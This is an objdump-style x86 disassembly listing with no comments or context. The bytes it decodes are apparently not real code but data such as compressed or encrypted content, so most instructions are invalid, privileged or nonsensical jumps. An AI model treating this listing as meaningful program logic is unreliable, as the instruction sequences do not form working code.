  41c7b2:	add    BYTE PTR [eax],al
  41c7b4:	mov    bh,ah
  41c7b6:	(bad)  
  41c7b7:	dec    esi
  41c7b8:	idiv   DWORD PTR [edi-0x75]
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0xfbfa6554
  41c7c3:	xchg   edx,eax
  41c7c4:	adc    DWORD PTR [ebx],esi
  41c7c6:	add    DWORD PTR [eax],eax
  41c7c8:	cmc    
  41c7c9:	add    BYTE PTR [eax],al
  41c7cb:	add    BYTE PTR [eax+0x651aadd9],dl
  41c7d1:	push   edx
  41c7d2:	mov    ds:0x47b3ebef,eax
  41c7d7:	pop    esp
  41c7d8:	dec    edi
  41c7d9:	and    al,0xb4
  41c7db:	jmp    0xdb9f99ef
  41c7e0:	sti    
  41c7e1:	dec    edi
  41c7e2:	loop   0x41c858
  41c7e4:	rcl    BYTE PTR [edi-0x38],0xe0
  41c7e8:	dec    edi
  41c7e9:	pop    esi
  41c7ea:	adc    eax,0xb910678b
  41c7ef:	retf   
  41c7f0:	ins    DWORD PTR es:[edi],dx
  41c7f1:	dec    edx
  41c7f2:	pop    ds
  41c7f3:	test   DWORD PTR [ebp+0x186e99f6],0xefcc10f1
  41c7fd:	adc    DWORD PTR [ebp-0x2d7c2ab3],ebx
  41c803:	or     eax,0x8e2c3bbe
  41c808:	lds    esp,FWORD PTR ss:[ebp+0x6b355129]
  41c80f:	adc    ah,bl
  41c811:	xor    ebp,DWORD PTR [edx-0x4a]
  41c814:	int3   
  41c815:	and    BYTE PTR [edi-0x77],dl
  41c818:	jg     0x41c79c
  41c81a:	mov    ah,0xc2
  41c81c:	adc    eax,0xe849d1fe
  41c821:	inc    edx
  41c822:	xchg   ch,bh
  41c824:	(bad)  
  41c825:	pop    ebx
  41c826:	stos   BYTE PTR es:[edi],al
  41c827:	or     BYTE PTR [eax-0x4d],0xca
  41c82b:	(bad)  
  41c82d:	dec    eax
  41c82e:	out    dx,eax
  41c82f:	std    
  41c830:	or     DWORD PTR [eax-0x1d],edx
  41c833:	out    dx,eax
  41c834:	loope  0x41c7bf
  41c836:	adc    eax,0xf7b54394
  41c83b:	imul   edi,DWORD PTR ds:0x2516e92,0xffffffd3
  41c842:	pop    edi
  41c843:	jo     0x41c89d
  41c845:	add    eax,0xd3719f6f
  41c84a:	daa    
  41c84b:	pop    ebx
  41c84c:	mov    esp,0x1890fbd3
  41c851:	pop    ss
  41c852:	arpl   WORD PTR [ecx+ebp*8+0x45e4a388],bp
  41c859:	cmp    DWORD PTR [eax-0x2f5a0ab1],ebx
  41c85f:	add    al,0x6e
  41c861:	ins    DWORD PTR es:[edi],dx
  41c862:	and    al,0xef
  41c864:	iret   
  41c865:	into   
  41c866:	ficomp DWORD PTR [edx+ecx*1-0x5]
  41c86a:	jl     0x41c8e7
  41c86c:	call   0xe47e4a10
  41c871:	push   es
  41c872:	lea    edi,[ecx]
  41c874:	stc    
  41c875:	mov    cl,0xba
  41c877:	pop    ecx
  41c878:	mov    cl,0xa0
  41c87a:	xchg   edx,eax
  41c87b:	les    esi,FWORD PTR [edx]
  41c87d:	loopne 0x41c8a7
  41c87f:	add    eax,0xb7c4b654
  41c884:	inc    edi
  41c885:	jae    0x41c8e2
  41c887:	xchg   esp,eax
  41c888:	adc    bl,BYTE PTR [ebx+0x27f26a9f]
  41c88e:	les    ecx,FWORD PTR ds:0x5a104d7
  41c894:	xchg   esp,eax
  41c895:	pop    es
  41c896:	arpl   WORD PTR [esi],bx
  41c898:	add    dh,cl
  41c89a:	push   ecx
  41c89b:	cmp    eax,0xeb9a0ba6
  41c8a0:	jo     0x41c844
  41c8a2:	stos   DWORD PTR es:[edi],eax
  41c8a3:	fadd   st(3),st
  41c8a5:	mov    ecx,0xaf1b208a
  41c8aa:	scas   eax,DWORD PTR es:[edi]
  41c8ab:	xchg   edx,eax
  41c8ac:	fwait
  41c8ad:	push   ebp
  41c8ae:	adc    al,0x9b
  41c8b0:	lock js 0x41c86e
  41c8b3:	aam    0x4
  41c8b5:	repz repnz dec edi
  41c8b8:	mov    BYTE PTR [ebp+0x47f99811],dh
  41c8be:	jle    0x41c869
  41c8c0:	and    DWORD PTR [eax],eax
	...
  41c932:	add    BYTE PTR [eax],al
  41c934:	ret    
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	fucomip st,st(6)
  41c942:	scas   al,BYTE PTR es:[edi]
  41c943:	pushf  
  41c944:	push   es
  41c945:	xor    al,0x1
  41c947:	add    ch,dh
  41c949:	add    BYTE PTR [eax],al
  41c94b:	add    BYTE PTR [esp+ebx*2],cl
  41c94e:	fisub  DWORD PTR [edx]
  41c950:	add    ch,BYTE PTR [ecx+0x13]
  41c953:	dec    edi
  41c954:	scas   eax,DWORD PTR es:[edi]
  41c955:	popf   
  41c956:	push   edx
  41c957:	loop   0x41c97f
  41c959:	push   ss
  41c95a:	pop    esp
  41c95b:	cmp    al,0xb
  41c95d:	inc    ebp
  41c95e:	das    
  41c95f:	sbb    al,0xb4
  41c961:	inc    edi
  41c962:	stos   DWORD PTR es:[edi],eax
  41c963:	scas   al,BYTE PTR es:[edi]
  41c964:	xchg   ecx,eax
  41c965:	lock sbb edi,esp
  41c968:	lock cmp al,0x6e
  41c96b:	or     eax,0x2989a2fc
  41c970:	das    
  41c971:	test   DWORD PTR [edx+0x3f3bb789],edi
  41c977:	iret   
  41c978:	mov    al,BYTE PTR [ebp+0x50]
  41c97b:	or     eax,0xbf05146c
  41c980:	jns    0x41c931
  41c982:	and    ebx,DWORD PTR [ebx-0x2f]
  41c985:	dec    esp
  41c986:	retf   0x97df
  41c989:	xchg   edi,eax
  41c98a:	xlat   BYTE PTR ds:[ebx]
  41c98b:	sbb    BYTE PTR ss:[edx+0x54],dh
  41c98f:	ret    0x2621
  41c992:	shl    dl,0x10
  41c995:	sub    eax,0xbb41a08d
  41c99a:	push   cs
  41c99b:	jns    0x41c9e7
  41c99d:	std    
  41c99e:	daa    
  41c99f:	aad    0x5c
  41c9a1:	into   
  41c9a2:	adc    eax,0x336b4961
  41c9a7:	call   0x2b3e26cc
  41c9ac:	das    
  41c9ad:	pop    ecx
  41c9ae:	pop    ds
  41c9af:	jmp    0xa6f20c51
  41c9b4:	add    BYTE PTR [ecx+0x24],dl
  41c9b7:	add    BYTE PTR [eax],ah
  41c9b9:	adc    BYTE PTR [edx],dh
  41c9bb:	fistp  DWORD PTR [ebx+0x7c]
  41c9be:	stos   DWORD PTR es:[edi],eax
  41c9bf:	arpl   si,bx
  41c9c1:	outs   dx,BYTE PTR ds:[esi]
  41c9c2:	xor    ah,BYTE PTR [edx]
  41c9c4:	out    0x4,al
  41c9c6:	push   0x6c59d020
  41c9cb:	stos   DWORD PTR es:[edi],eax
  41c9cc:	pop    edi
  41c9cd:	aam    0xbe
  41c9cf:	xor    al,0x4f
  41c9d1:	fdivp  st(7),st
  41c9d3:	adc    ebx,DWORD PTR [ecx+0x346c4345]
  41c9d9:	push   0x1a
  41c9db:	pop    ecx
  41c9dc:	xchg   esp,eax
  41c9dd:	stc    
  41c9de:	sub    esi,esp
  41c9e0:	dec    esp
  41c9e1:	and    DWORD PTR [edi],ebx
  41c9e3:	scas   al,BYTE PTR es:[edi]
  41c9e4:	das    
  41c9e5:	repnz add cl,BYTE PTR [esi]
  41c9e8:	pop    edi
  41c9e9:	in     al,0x87
  41c9eb:	and    ebx,ebp
  41c9ed:	push   0x2e50e09f
  41c9f2:	out    dx,al
  41c9f3:	ins    BYTE PTR es:[edi],dx
  41c9f4:	std    
  41c9f5:	je     0x41c9e7
  41c9f7:	ss daa 
  41c9f9:	aas    
  41c9fa:	cs xchg ecx,eax
  41c9fc:	test   al,0xcb
  41c9fe:	fdiv   QWORD PTR [edi-0x4408b6c4]
  41ca04:	sub    ebp,DWORD PTR [ebx+ebp*1+0x27]
  41ca08:	jns    0x41ca0a
  41ca0a:	dec    esi
  41ca0b:	cmp    DWORD PTR [eax+0x3f],ebx
  41ca0e:	in     al,0x39
  41ca10:	in     al,0xb3
  41ca12:	dec    ebx
  41ca13:	or     esp,DWORD PTR [esi+ebp*8+0xf]
  41ca17:	mov    ecx,DWORD PTR [edi+0xd]
  41ca1a:	hlt    
  41ca1b:	pop    esi
  41ca1c:	(bad)  [edx-0x6b1d3e0a]
  41ca22:	ins    DWORD PTR es:[edi],dx
  41ca23:	rcr    BYTE PTR [ecx],1
  41ca25:	cld    
  41ca26:	(bad)  
  41ca27:	xchg   ecx,eax
  41ca28:	cld    
  41ca29:	mov    eax,ds:0xce38fa98
  41ca2e:	or     eax,DWORD PTR [ecx-0x60f42a9a]
  41ca34:	and    al,0xcb
  41ca36:	pop    edi
  41ca37:	scas   eax,DWORD PTR es:[edi]
  41ca38:	mov    esi,0x6c12b423
  41ca3d:	ins    DWORD PTR es:[edi],dx
  41ca3e:	imul   esp,DWORD PTR [eax+0x2e],0x0
	...
  41cab2:	add    BYTE PTR [eax],al
  41cab4:	or     bh,BYTE PTR [eax-0x4048555b]
  41caba:	(bad)  
  41cabc:	sbb    eax,0xe2e2887e
  41cac1:	dec    esi
  41cac2:	sbb    eax,0x134fb5d
  41cac7:	add    ch,dh
  41cac9:	add    BYTE PTR [eax],al
  41cacb:	add    BYTE PTR [edx],dh
  41cacd:	mov    cl,0x45
  41cacf:	push   es
  41cad0:	lds    esi,FWORD PTR [edx+edx*1+0x6d]
  41cad4:	push   ss
  41cad5:	lock xchg ebp,eax
  41cad7:	ds repz fucomp st(0)
  41cadb:	aaa    
  41cadc:	ins    DWORD PTR es:[edi],dx
  41cadd:	fcom   DWORD PTR [esi-0x3d1df872]
  41cae3:	mov    ebp,0x85b67cd7
  41cae8:	cmp    BYTE PTR [ecx-0x33b1c0a4],bh
  41caee:	dec    esp
  41caef:	ds or  al,0x96
  41caf2:	mov    dh,0x2d
  41caf4:	jne    0x41cb52
  41caf6:	sub    esi,ebp
  41caf8:	fimul  WORD PTR [esi-0x67]
  41cafb:	dec    esp
  41cafc:	sbb    BYTE PTR [ecx-0x565ce382],0x56
  41cb03:	mov    al,ds:0xefcfe475
  41cb08:	pop    ebp
  41cb09:	pusha  
  41cb0a:	(bad)  
  41cb0c:	mov    ds:0x4fb43f3f,eax
  41cb11:	xor    al,BYTE PTR [ebx-0x68bbcd73]
  41cb17:	xor    al,0xe5
  41cb19:	(bad)  
  41cb1a:	out    0x36,al
  41cb1c:	jne    0x41cb96
  41cb1e:	jg     0x41caeb
  41cb20:	into   
  41cb21:	adc    al,0xe3
  41cb23:	pop    ebp
  41cb24:	and    esi,ebp
  41cb26:	mov    dl,0x23
  41cb28:	push   cs
  41cb29:	outs   dx,DWORD PTR ds:[esi]
  41cb2a:	xcrypt-cbc (bad)
  41cb2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb2c:	push   edx
  41cb2d:	push   es
  41cb2e:	mov    dh,0xdd
  41cb30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb32:	fisubr DWORD PTR [esi]
  41cb34:	cmp    DWORD PTR [ebx],edx
  41cb36:	loop   0x41cb6b
  41cb38:	cmp    eax,0xb966560
  41cb3d:	push   ebp
  41cb3e:	pop    ebx
  41cb3f:	dec    edx
  41cb40:	dec    ebp
  41cb41:	inc    ecx
  41cb42:	add    ch,BYTE PTR [edi]
  41cb44:	or     al,0xca
  41cb46:	sbb    al,0xb9
  41cb48:	loopne 0x41cb6d
  41cb4a:	imul   ebp,DWORD PTR [edi],0xffffff8f
  41cb4d:	retf   
  41cb4e:	add    al,dh
  41cb50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb51:	dec    edx
  41cb52:	out    dx,eax
  41cb53:	or     eax,0x3111e4ee
  41cb58:	sub    eax,0x1eea58b5
  41cb5d:	jle    0x41cb8d
  41cb5f:	ret    0x2d3c
  41cb62:	xlat   BYTE PTR ds:[ebx]
  41cb63:	xor    BYTE PTR ds:0x4e7d23f3,al
  41cb69:	ss out dx,eax
  41cb6b:	(bad)  
  41cb6c:	adc    BYTE PTR ds:0x36e729a1,cl
  41cb72:	int    0xb6
  41cb74:	ficomp WORD PTR [esi]
  41cb76:	aaa    
  41cb77:	xchg   DWORD PTR [ebx],edx
  41cb79:	mov    esi,0x75f57bf2
  41cb7e:	loope  0x41cb77
  41cb80:	mov    ecx,0xac48ceb8
  41cb85:	call   0x29c6:0xbced0727
  41cb8c:	loopne 0x41cb71
  41cb8e:	cld    
  41cb8f:	add    eax,0xb374345b
  41cb94:	pop    esi
  41cb95:	mov    ah,0xe1
  41cb97:	not    DWORD PTR cs:[ebx+0x35]
  41cb9b:	loope  0x41cb74
  41cb9d:	jb     0x41cc00
  41cb9f:	(bad)  
  41cba0:	ds enter 0xb7a2,0x2a
  41cba5:	stos   DWORD PTR es:[edi],eax
  41cba6:	cmp    eax,0x2f0b07e2
  41cbab:	test   ecx,0xca1dd585
  41cbb1:	or     esp,DWORD PTR fs:[edx-0x54bccaf8]
  41cbb8:	pop    es
  41cbb9:	pop    es
  41cbba:	or     al,0xba
  41cbbc:	dec    edi
  41cbbd:	jmp    0x0:0x53a88b
	...
  41cc34:	shl    BYTE PTR [edx],cl
  41cc36:	cli    
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0x46
  41cc41:	stos   WORD PTR es:[edi],ax
  41cc43:	sti    
  41cc44:	lock xor eax,0xf50001
  41cc4a:	add    BYTE PTR [eax],al
  41cc4c:	xchg   edx,eax
  41cc4d:	pop    esp
  41cc4e:	enter  0x7a1e,0xc2
  41cc52:	std    
  41cc53:	cmp    eax,0xd0701a48
  41cc58:	push   cs
  41cc59:	sbb    esp,DWORD PTR [eax+edi*1]
  41cc5c:	push   0x52
  41cc5e:	mov    esp,0x7d8ed21e
  41cc63:	aaa    
  41cc64:	scas   eax,DWORD PTR es:[edi]
  41cc65:	je     0x41cc6c
  41cc67:	popf   
  41cc68:	push   ds
  41cc69:	adc    edx,esi
  41cc6b:	dec    edi
  41cc6c:	and    eax,0xd045450a
  41cc71:	in     eax,0x12
  41cc73:	mov    cs,WORD PTR [esi]
  41cc75:	or     DWORD PTR [ebp-0x45],esp
  41cc78:	sbb    ebp,ebp
  41cc7a:	pop    eax
  41cc7b:	sbb    al,0x4c
  41cc7d:	mov    ecx,0x2342889d
  41cc82:	das    
  41cc83:	xor    BYTE PTR [ebx],bh
  41cc85:	xchg   DWORD PTR [esi+0x73],eax
  41cc88:	loope  0x41ccbc
  41cc8a:	addr16 loop 0x41cc3e
  41cc8d:	cdq    
  41cc8e:	cmp    al,0x9d
  41cc90:	pop    edi
  41cc91:	push   esp
  41cc92:	std    
  41cc93:	pop    eax
  41cc94:	lods   al,BYTE PTR ds:[esi]
  41cc95:	add    DWORD PTR [ecx-0x6b5901c3],ecx
  41cc9b:	mov    ebp,0xd59c2c5
  41cca0:	push   ebp
  41cca1:	push   ebp
  41cca2:	or     al,0x1a
  41cca4:	cld    
  41cca5:	out    0x3b,al
  41cca7:	adc    al,0xf8
  41cca9:	fs inc ecx
  41ccab:	(bad)  
  41ccac:	mov    dl,BYTE PTR [edx+0xa]
  41ccaf:	dec    eax
  41ccb0:	ret    
  41ccb1:	test   al,0x88
  41ccb3:	in     al,dx
  41ccb4:	lods   al,BYTE PTR ds:[esi]
  41ccb5:	in     al,dx
  41ccb6:	call   0xcf0e:0x5521557d
  41ccbd:	and    al,0xf6
  41ccbf:	cmp    BYTE PTR [ecx-0x4c],cl
  41ccc2:	adc    cl,BYTE PTR [edx+0x5a9fa437]
  41ccc8:	int3   
  41ccc9:	cmp    eax,0x4b4aaddf
  41ccce:	cmp    dl,bl
  41ccd0:	jae    0x41cc80
  41ccd2:	sbb    BYTE PTR [ecx],ah
  41ccd4:	sbb    al,0x67
  41ccd6:	xlat   BYTE PTR ds:[ebx]
  41ccd7:	jl     0x41cd30
  41ccd9:	jp     0x41cc60
  41ccdb:	das    
  41ccdc:	mov    eax,0x399c6f0c
  41cce1:	xor    bh,bh
  41cce3:	or     al,0x7d
  41cce5:	jmp    0x9dddf7ab
  41ccea:	xchg   DWORD PTR [eax+esi*8-0xb6da44f],esi
  41ccf1:	sub    eax,0x4516ff4d
  41ccf6:	fdivr  QWORD PTR [ecx]
  41ccf8:	(bad)  
  41ccf9:	rcl    DWORD PTR [esi],1
  41ccfb:	mov    ah,0x6b
  41ccfd:	repz (bad) 
  41ccff:	pop    es
  41cd00:	and    DWORD PTR [ecx],ecx
  41cd02:	cdq    
  41cd03:	push   esp
  41cd04:	inc    esp
  41cd05:	push   ds
  41cd06:	jo     0x41ccb7
  41cd08:	fstp   DWORD PTR ds:0x33cb03ec
  41cd0e:	sub    ah,dl
  41cd10:	mov    ds:0x516eb158,eax
  41cd15:	sar    BYTE PTR [ecx+0x326bf7a6],cl
  41cd1b:	sbb    eax,DWORD PTR [eax-0x6d]
  41cd1e:	cld    
  41cd1f:	mov    ch,0x92
  41cd21:	jg     0x41cd93
  41cd23:	int3   
  41cd24:	cld    
  41cd25:	mov    DWORD PTR [esi],ecx
  41cd27:	mov    DWORD PTR [esi+ebp*1+0x3a567c7e],ecx
  41cd2e:	out    dx,eax
  41cd2f:	lods   al,BYTE PTR ds:[esi]
  41cd30:	icebp  
  41cd31:	push   eax
  41cd32:	shr    BYTE PTR [eax*8-0x3308ef06],0xe0
  41cd3a:	aas    
  41cd3b:	inc    esi
  41cd3c:	popa   
  41cd3d:	(bad)  
  41cd3e:	mov    eax,0x7bbc
	...
  41cdb3:	add    BYTE PTR [ebp-0x63956373],al
  41cdb9:	jnp    0x41cdb2
  41cdbb:	out    dx,eax
  41cdbc:	push   ebp
  41cdbd:	call   0x50a2:0x420fb1bb
  41cdc4:	in     eax,0x36
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	cmc    
  41cdc9:	add    BYTE PTR [eax],al
  41cdcb:	add    BYTE PTR [eax*1-0x344d223d],ch
  41cdd2:	add    BYTE PTR ds:0x3fe15d3c,al
  41cdd8:	xor    eax,0xec28a2f7
  41cddd:	cs jns 0x41ce18
  41cde0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cde1:	jns    0x41cd95
  41cde3:	mov    eax,0xe46b3635
  41cde8:	mov    esi,esp
  41cdea:	sub    DWORD PTR [esi+0x24e9f971],edi
  41cdf0:	push   0xffffffff
  41cdf2:	push   edx
  41cdf3:	fdivr  QWORD PTR [esi+0x73]
  41cdf6:	in     al,0xa3
  41cdf8:	out    dx,al
  41cdf9:	mov    ebp,0x31893eee
  41cdfe:	dec    ecx
  41cdff:	jle    0x41ce31
  41ce01:	cs jno 0x41ce65
  41ce04:	cld    
  41ce05:	add    ebp,ebp
  41ce07:	data16 jo 0x41ce0d
  41ce0a:	ret    0xe9df
  41ce0d:	pop    es
  41ce0e:	std    
  41ce0f:	cmp    edx,DWORD PTR [edx-0x10]
  41ce12:	jbe    0x41ce59
  41ce14:	xchg   esi,eax
  41ce15:	jmp    0x561:0x8a223bf9
  41ce1c:	mov    bh,0x7c
  41ce1e:	push   ds
  41ce1f:	cmp    DWORD PTR [esi],edx
  41ce21:	fmul   QWORD PTR [esi]
  41ce23:	cld    
  41ce24:	popa   
  41ce25:	or     al,0xa5
  41ce27:	or     DWORD PTR [esp+esi*4-0x23],edi
  41ce2b:	cmp    dl,BYTE PTR [ebp-0x63]
  41ce2e:	jb     0x41ce43
  41ce30:	jmp    0x81ea:0x2e9f6fa4
  41ce37:	and    esp,ecx
  41ce39:	cmp    ebx,DWORD PTR [ebp+0x61]
  41ce3c:	adc    cl,bl
  41ce3e:	or     ebx,ebp
  41ce40:	mov    dl,0xff
  41ce42:	enter  0xd276,0xd
  41ce46:	xchg   edi,eax
  41ce47:	in     al,0x3b
  41ce49:	xor    DWORD PTR [ebx-0x3348df22],ecx
  41ce4f:	xor    DWORD PTR [edx+0x1],0x16
  41ce53:	jns    0x41ce17
  41ce55:	fstp   DWORD PTR [ebx+0x28]
  41ce58:	sbb    BYTE PTR [ecx],ch
  41ce5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce5b:	cwde   
  41ce5c:	aaa    
  41ce5d:	daa    
  41ce5e:	sbb    esi,DWORD PTR [edx-0x62167375]
  41ce64:	xor    eax,0x304a26b0
  41ce69:	sbb    eax,0xcafde853
  41ce6e:	iret   
  41ce6f:	pop    ebp
  41ce70:	lea    ebx,[esi]
  41ce72:	test   al,0xe1
  41ce74:	imul   edx,DWORD PTR [ebp+0x23],0xffffffc6
  41ce78:	add    edx,DWORD PTR [ebp+0x60]
  41ce7b:	sub    DWORD PTR [ecx+edx*1-0x314627d6],edi
  41ce82:	push   ebp
  41ce83:	fdiv   st(3),st
  41ce85:	mov    ebp,0x97d4be7
  41ce8a:	adc    al,0xe6
  41ce8c:	aas    
  41ce8d:	jns    0x41ce22
  41ce8f:	push   ecx
  41ce90:	xchg   ebx,eax
  41ce91:	sub    esi,eax
  41ce93:	stos   DWORD PTR es:[edi],eax
  41ce94:	retf   
  41ce95:	jmp    0x1cb5302e
  41ce9a:	sbb    al,BYTE PTR [edi-0x2f93778d]
  41cea0:	jb     0x41ceeb
  41cea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cea3:	retf   0x28d
  41cea6:	(bad)  
  41cea7:	js     0x41cf0f
  41cea9:	hlt    
  41ceaa:	mov    ebp,0x5b5e7da4
  41ceaf:	jecxz  0x41ce36
  41ceb1:	xchg   ebp,eax
  41ceb2:	in     al,dx
  41ceb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ceb4:	sar    edi,cl
  41ceb6:	fisttp WORD PTR [ecx-0x13]
  41ceb9:	adc    cl,BYTE PTR ds:0xb73069e
  41cebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cec0:	mov    al,0x0
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	fs jae 0x41cf6a
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	mov    ebx,DWORD PTR [eax+0x4f]
  41cf43:	ins    BYTE PTR es:[edi],dx
  41cf44:	fidiv  DWORD PTR [edi]
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	cmc    
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    bh,ah
  41cf4d:	push   eax
  41cf4e:	push   esi
  41cf4f:	(bad)  
  41cf50:	push   0x42c8d95
  41cf55:	mov    esp,0xc085cfb4
  41cf5a:	jecxz  0x41cf31
  41cf5c:	fadd   DWORD PTR [ecx-0x54ee491f]
  41cf62:	jo     0x41cf17
  41cf64:	js     0x41cfbf
  41cf66:	dec    ebp
  41cf67:	test   al,0x1d
  41cf69:	cmp    ch,al
  41cf6b:	dec    esi
  41cf6c:	lea    ebp,[eax-0x35]
  41cf6f:	enter  0xfbcb,0x82
  41cf73:	stos   DWORD PTR es:[edi],eax
  41cf74:	push   ebp
  41cf75:	mov    cl,0xbc
  41cf77:	xchg   ebx,eax
  41cf78:	imul   ebp,DWORD PTR [ebx+eax*8-0x7ac2f361],0x42
  41cf80:	add    eax,0x4dda66d3
  41cf85:	dec    eax
  41cf86:	cmp    al,0x7b
  41cf88:	sbb    BYTE PTR [edx+ebp*1+0x449c8136],dh
  41cf8f:	dec    edx
  41cf90:	fwait
  41cf91:	inc    eax
  41cf92:	bnd jle 0x41d014
  41cf95:	sbb    BYTE PTR [edi+ebx*1],0xa2
  41cf99:	mov    esi,0xe4d8f7a7
  41cf9e:	rol    DWORD PTR [ebx+ebx*1+0x20210c7e],1
  41cfa5:	das    
  41cfa6:	dec    eax
  41cfa7:	pop    eax
  41cfa8:	in     al,dx
  41cfa9:	push   ebp
  41cfaa:	adc    bl,BYTE PTR [ebp-0x6e]
  41cfad:	(bad)  
  41cfae:	jmp    0x41cf31
  41cfb0:	xor    al,0xff
  41cfb2:	adc    edx,edi
  41cfb4:	adc    eax,0x7492e304
  41cfb9:	dec    eax
  41cfba:	jg     0x41d02e
  41cfbc:	popf   
  41cfbd:	dec    ebp
  41cfbe:	inc    esp
  41cfbf:	mov    DWORD PTR [ecx+0x201499c2],esp
  41cfc5:	lea    eax,[eax-0x3d]
  41cfc8:	pop    esi
  41cfc9:	jbe    0x41cf4f
  41cfcb:	or     BYTE PTR [ecx-0x14],0xd0
  41cfcf:	ret    
  41cfd0:	mov    edi,0x2a670e04
  41cfd5:	xchg   ebp,eax
  41cfd6:	int3   
  41cfd7:	repz dec edi
  41cfd9:	sahf   
  41cfda:	adc    eax,0xb9eb54b0
  41cfdf:	push   bp
  41cfe1:	xor    dl,BYTE PTR [bp+di]
  41cfe4:	std    
  41cfe5:	inc    edx
  41cfe6:	ja     0x41d054
  41cfe8:	int3   
  41cfe9:	into   
  41cfea:	popa   
  41cfeb:	xchg   DWORD PTR [ebx],ebx
  41cfed:	out    dx,al
  41cfee:	dec    eax
  41cfef:	outs   dx,DWORD PTR ds:[esi]
  41cff0:	cmp    edi,DWORD PTR [ecx-0x72]
  41cff3:	in     al,0xd0
  41cff5:	idiv   ebx
  41cff7:	add    esi,DWORD PTR [esi-0x69]
  41cffa:	cmp    DWORD PTR [edx+eiz*4-0x1502faa9],ebp
  41d001:	adc    al,0xb9
  41d003:	jb     0x41cfa8
  41d005:	dec    ebx
  41d006:	adc    eax,0xf0b324ee
  41d00b:	mov    dl,0x3a
  41d00d:	shrd   DWORD PTR [ebp+0x55],esp,0x96
  41d012:	push   0xffffffdd
  41d014:	mov    ch,0x5d
  41d016:	fldln2 
  41d018:	in     al,dx
  41d019:	outs   dx,BYTE PTR ds:[esi]
  41d01a:	adc    BYTE PTR [esi-0x64026199],ah
  41d020:	pusha  
  41d021:	and    al,0xe4
  41d023:	js     0x41d0a1
  41d025:	gs jl  0x41d06d
  41d028:	xchg   edx,eax
  41d029:	push   edx
  41d02a:	pop    ss
  41d02b:	sar    BYTE PTR [ebp+0x70ad1ec8],1
  41d031:	sub    dh,BYTE PTR [ebx]
  41d033:	inc    esi
  41d034:	adc    DWORD PTR [ebp+0x55],edi
  41d037:	rcl    ah,cl
  41d039:	sbb    al,0xe7
  41d03b:	jp     0x41d071
  41d03d:	test   ah,ah
  41d03f:	mov    ah,0x77
	...
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    cl,bl
  41d0b5:	dec    edx
  41d0b6:	mov    eax,ds:0xd9fbb3f8
  41d0bb:	imul   ebp,DWORD PTR [edx-0x167f5868],0x68
  41d0c2:	adc    bl,ah
  41d0c4:	iret   
  41d0c5:	cmp    BYTE PTR [ecx],al
  41d0c7:	add    ch,dh
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    BYTE PTR [ebp+0x6658ce94],al
  41d0d1:	mov    dl,0x5b
  41d0d3:	pop    ebx
  41d0d4:	rcr    BYTE PTR [esi+0xb266fb4],cl
  41d0da:	jb     0x41d0fb
  41d0dc:	jne    0x41d0d5
  41d0de:	push   0xb3f3afe4
  41d0e3:	xchg   ecx,eax
  41d0e4:	jmp    0x8783b87c
  41d0e9:	dec    ebp
  41d0ea:	scas   eax,DWORD PTR es:[edi]
  41d0eb:	mov    DWORD PTR [ebp+ebp*2+0x6b],ebx
  41d0ef:	add    DWORD PTR ds:0x5130e6b2,0x35a1fc01
  41d0f9:	inc    eax
  41d0fa:	sub    DWORD PTR [edi-0x2ce39243],ebx
  41d100:	shr    BYTE PTR [esi-0x29ccf8a4],0x8
  41d107:	sub    edi,DWORD PTR [eax-0x6e90fb61]
  41d10d:	sbb    bl,ch
  41d10f:	data16 mov bl,0x84
  41d112:	cmp    DWORD PTR [edx-0x46],eax
  41d115:	add    DWORD PTR [edx*1+0x4dcc924f],ecx
  41d11c:	ins    DWORD PTR es:[edi],dx
  41d11d:	jo     0x41d0cc
  41d11f:	pop    edi
  41d120:	stos   BYTE PTR es:[edi],al
  41d121:	ss dec eax
  41d123:	pop    edx
  41d124:	retf   0xb65a
  41d127:	jno    0x41d0f3
  41d129:	and    BYTE PTR [esi+ecx*2],ah
  41d12c:	xchg   esp,eax
  41d12d:	sahf   
  41d12e:	(bad)  
  41d12f:	mov    eax,0x23058cc1
  41d134:	cmp    eax,0x92d808c
  41d139:	add    esp,0x33
  41d13c:	cmp    dh,al
  41d13e:	scas   al,BYTE PTR es:[edi]
  41d13f:	daa    
  41d140:	inc    ebp
  41d141:	aas    
  41d142:	xor    BYTE PTR [edi+0xc],cl
  41d145:	fwait
  41d146:	push   DWORD PTR [edi-0x57a82c0c]
  41d14c:	in     eax,dx
  41d14d:	fild   DWORD PTR [ebp+0x18dd4ffc]
  41d153:	lods   al,BYTE PTR ds:[esi]
  41d154:	and    BYTE PTR [ebx],dl
  41d156:	jae    0x41d0ef
  41d158:	retf   0xfcde
  41d15b:	sbb    BYTE PTR [eax+0x1190aa86],dh
  41d161:	in     eax,0xdb
  41d163:	xlat   BYTE PTR ds:[ebx]
  41d164:	sbb    eax,0x7ebb14b
  41d169:	mov    dh,0x9d
  41d16b:	(bad)  
  41d16d:	outs   dx,BYTE PTR ds:[esi]
  41d16e:	push   ebx
  41d16f:	mov    ah,0x4b
  41d171:	rcr    esp,0x31
  41d174:	or     DWORD PTR [ebx+eax*8],edx
  41d177:	pop    ebx
  41d178:	push   esp
  41d179:	test   bh,dh
  41d17b:	retf   0x2d32
  41d17e:	cmp    edx,DWORD PTR ss:[eax]
  41d181:	popa   
